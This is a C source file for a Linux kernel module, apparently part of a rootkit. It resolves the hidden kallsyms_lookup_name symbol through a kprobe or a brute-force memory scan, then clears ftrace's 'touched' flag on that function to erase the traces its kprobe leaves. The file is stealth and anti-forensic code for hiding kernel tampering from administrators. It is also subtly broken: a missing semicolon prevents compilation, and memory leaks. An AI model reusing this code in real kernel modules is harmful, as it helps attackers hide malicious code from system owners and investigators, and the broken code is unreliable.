#include <linux/init.h>
#include <linux/kprobes.h>
#include <linux/ftrace.h>
#include <linux/kallsyms.h>
#include "util.h"

void clean_ftrace_touched(char *name);

static int unresolved_syms = 0;
typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
static kallsyms_lookup_name_t kallsyms_lookup_name_f = NULL;

#ifdef KPROBE_LOOKUP
static struct kprobe kp = {
    .symbol_name = "kallsyms_lookup_name"
}
#else
// https://github.com/xcellerator/linux_kernel_hacking/issues/3#issue-782815541
unsigned long kaddr_lookup_name(const char *fname_raw)
{
    int i;
    unsigned long kaddr;
    char *fname_lookup, *fname;

    fname_lookup = kzalloc(NAME_MAX, GFP_KERNEL);
    if (!fname_lookup)
        return 0;

    fname = kzalloc(strlen(fname_raw)+5, GFP_KERNEL);
    if (!fname)
        return 0;

    /*
     * We have to add "+0x0" to the end of our function name
     * because that's the format that sprint_symbol() returns
     * to us. If we don't do this, then our search can stop
     * prematurely and give us the wrong function address!
     */
    strcpy(fname, fname_raw);
    strcat(fname, "+0x0");

    /*
     * Get the kernel base address:
     * sprint_symbol() is less than 0x100000 from the start of the kernel, so
     * we can just AND-out the last 3 bytes from it's address to the the base
     * address.
     * There might be a better symbol-name to use?
     */
    kaddr = (unsigned long) &sprint_symbol;
    kaddr &= 0xffffffffff000000;

    /*
     * All the syscalls (and all interesting kernel functions I've seen so far)
     * are within the first 0x100000 bytes of the base address. However, the kernel
     * functions are all aligned so that the final nibble is 0x0, so we only
     * have to check every 16th address.
     */
    for ( i = 0x0 ; i < 0x100000 ; i++ )
    {
        /*
         * Lookup the name ascribed to the current kernel address
         */
        sprint_symbol(fname_lookup, kaddr);

        /*
         * Compare the looked-up name to the one we want
         */
        if ( strncmp(fname_lookup, fname, strlen(fname)) == 0 )
        {
            /*
             * Clean up and return the found address
             */
            kfree(fname_lookup);
            return kaddr;
        }
        /*
         * Jump 16 addresses to next possible address
         */
        kaddr += 0x10;
    }
    /*
     * We didn't find the name, so clean up and return 0
     */
    kfree(fname_lookup);
    return 0;
}
#endif

unsigned long resolve_sym(const char *sym_name)
{
    if (kallsyms_lookup_name_f == NULL) {
#ifdef KPROBE_LOOKUP
        register_kprobe(&kp);
        kallsyms_lookup_name_f = (kallsyms_lookup_name_t) kp.addr;
        unregister_kprobe(&kp);
        // using kprobes will mark this as touched in the ftrace fs,
        // so we have to clean that up.
        clean_ftrace_touched("kallsyms_lookup_name");
#else
        kallsyms_lookup_name_f =
            (kallsyms_lookup_name_t) kaddr_lookup_name("kallsyms_lookup_name");
#endif
    }
    unsigned long ret = kallsyms_lookup_name_f(sym_name);
    if (ret == (unsigned long) NULL) unresolved_syms++;
    return ret;
}

int is_unresolved_sym()
{
    return unresolved_syms > 0;
}


struct ftrace_page {
	struct ftrace_page	*next;
	struct dyn_ftrace	*records;
	int			index;
	int			order;
};

#define do_for_each_ftrace_rec(pg, rec)					\
	for (pg = ftrace_pages_start; pg; pg = pg->next) {		\
		int _____i;						\
		for (_____i = 0; _____i < pg->index; _____i++) {	\
			rec = &pg->records[_____i];


#define while_for_each_ftrace_rec()		\
		}				\
	}


typedef int (*lookup_symbol_name_fn)(unsigned long addr, char *symname);
static lookup_symbol_name_fn lookup_symbol_f;

// https://youtube.com/watch?v=uKqriTRYInY
void clean_ftrace_touched(char *name)
{
    char sym_name[KSYM_SYMBOL_LEN];
    struct ftrace_page *pg;
	struct dyn_ftrace *rec;
    struct ftrace_page	*ftrace_pages_start =
        *(struct ftrace_page **)resolve_sym("ftrace_pages_start");
    lookup_symbol_f = (lookup_symbol_name_fn)resolve_sym("lookup_symbol_name");
    if (ftrace_pages_start == 0 || lookup_symbol_f == 0)
        return;

    do_for_each_ftrace_rec(pg, rec) {
        if (!(rec->flags & FTRACE_FL_TOUCHED)) continue;

        lookup_symbol_f(rec->ip, sym_name);
        if (strcmp(name, sym_name) == 0) {
            rec->flags &= ~FTRACE_FL_TOUCHED;
        }
        continue;
    } while_for_each_ftrace_rec();
}
